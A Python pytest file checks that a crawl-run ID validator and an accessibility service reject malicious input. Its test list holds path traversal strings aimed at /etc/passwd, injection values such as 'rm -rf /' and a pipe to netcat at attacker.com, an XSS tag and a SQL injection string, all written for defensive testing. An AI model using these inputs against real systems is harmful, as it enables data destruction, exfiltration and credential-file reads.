"""Security tests verifying Phase 10 security boundaries, path traversal defense, and passive safety."""

import pytest

from site_dna.analysis.accessibility.context_builder import validate_crawl_run_id
from site_dna.analysis.accessibility.service import AccessibilityService


def test_path_traversal_on_crawl_run_id():
    malicious_ids = [
        "../../etc/passwd",
        "..\\..\\windows\\win.ini",
        "/absolute/path/attack",
        "C:\\system32\\cmd.exe",
        "crawl-a; rm -rf /",
        "crawl-a | nc attacker.com 1337",
        "../../../runs/secret",
        "run<script>",
        "run' OR 1=1 --",
    ]

    for bad_id in malicious_ids:
        with pytest.raises(ValueError):
            validate_crawl_run_id(bad_id)


def test_service_rejects_malicious_id():
    service = AccessibilityService()
    with pytest.raises(ValueError):
        service._resolve_run_dir("../../malicious")


def test_passive_safety_guarantee():
    # Accessibility analysis must never trigger external live network mutations
    service = AccessibilityService()
    assert hasattr(service, "analyze_crawl_run")
